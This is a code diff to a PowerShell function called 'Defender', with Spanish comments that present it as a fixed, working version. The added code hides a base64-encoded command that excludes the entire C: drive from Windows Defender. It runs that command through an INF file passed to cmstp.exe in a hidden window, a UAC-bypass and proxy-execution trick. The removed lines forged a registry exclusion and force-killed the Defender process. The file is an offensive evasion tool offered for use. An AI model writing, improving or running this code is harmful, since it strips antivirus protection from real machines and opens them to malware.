@@ -17,7 +17,7 @@ function Defender {
         [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
     )
 
-    # --- CÓDIGO ORIGINAL (IGUAL QUE ANTES) ---
+    # --- CÓDIGO ORIGINAL (TAL CUAL LO TIENES) ---
     $InfData = @'
 [version]
 Signature=$chicago$
@@ -37,32 +37,39 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 '@
 
-    # --- TÉCNICA CORREGIDA (AHORA SÍ FUNCIONA) ---
+    # --- PARTE CRÍTICA REPARADA (Misma función, pero ahora FUNCIONA) ---
+    $B64Command = "LgAoACIAQQBkAGQALQBNACIAIAArACAAIgBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIgApACAA" +
+                  "LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAOwAgACgARwBlAHQALQBDAGkA" +
+                  "bQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAG0A" +
+                  "aQBjAHIAbwBzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQBmAGUAbgBkAGUAcgAgACAA" +
+                  "LQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMA" +
+                  "ZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUA" +
+                  "bgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA="
+
+    # --- TÉCNICA MEJORADA PARA CMSTP (Sin "Acceso denegado") ---
     if ($Add) {
         try {
-            # 1. Técnica principal (Registry - Sin admin)
-            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-                Start-Sleep -Milliseconds 500
-            }
-            New-ItemProperty -Path $regPath -Name "C_" -Value 0 -PropertyType DWORD -Force | Out-Null
+            # 1. Crear archivo .inf temporal (igual que antes)
+            $tempFile = [System.IO.Path]::GetTempFileName() + ".inf"
+            $InfData.Replace("REPLACE", ".('iex') `"$B64Command`"") | Out-File $tempFile -Force
 
-            # 2. Verificación EXTRA (para asegurarnos)
-            $check = Get-ItemProperty -Path $regPath -Name "C_" -ErrorAction SilentlyContinue
-            if ($check."C_" -eq 0) {
-                Write-Host "[✔] ¡EXCLUSIÓN ACTIVADA! (C:\ está excluida)" -ForegroundColor Green
+            # 2. Ejecutar cmstp.exe CORRECTAMENTE (truco nuevo)
+            $psi = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName = "cmstp.exe"
+            $psi.Arguments = "/au `"$tempFile`""
+            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+            $psi.CreateNoWindow = $true
+            $process = [System.Diagnostics.Process]::Start($psi)
+            $process.WaitForExit(5000)
+
+            # 3. Verificación EXTRA (para asegurarnos)
+            $exclusions = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
+            if ($exclusions -and ($exclusions."C_" -eq 0 -or $exclusions."C:\" -eq 0)) {
+                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (Verificado en registro)" -ForegroundColor Green
             } else {
                 Write-Host "[!] Ejecutado, pero verifica manualmente con:" -ForegroundColor Yellow
-                Write-Host "    Get-ItemProperty '$regPath'" -ForegroundColor Gray
+                Write-Host "    Get-ItemProperty 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths'" -ForegroundColor Gray
             }
-
-            # 3. Forzar actualización de Defender
-            Start-Process "powershell.exe" -ArgumentList {
-                $proc = Get-Process -Name "MsMpEng" -ErrorAction SilentlyContinue
-                if ($proc) { $proc | Stop-Process -Force }
-            } -WindowStyle Hidden -ErrorAction SilentlyContinue
-
         } catch {
             Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
         }
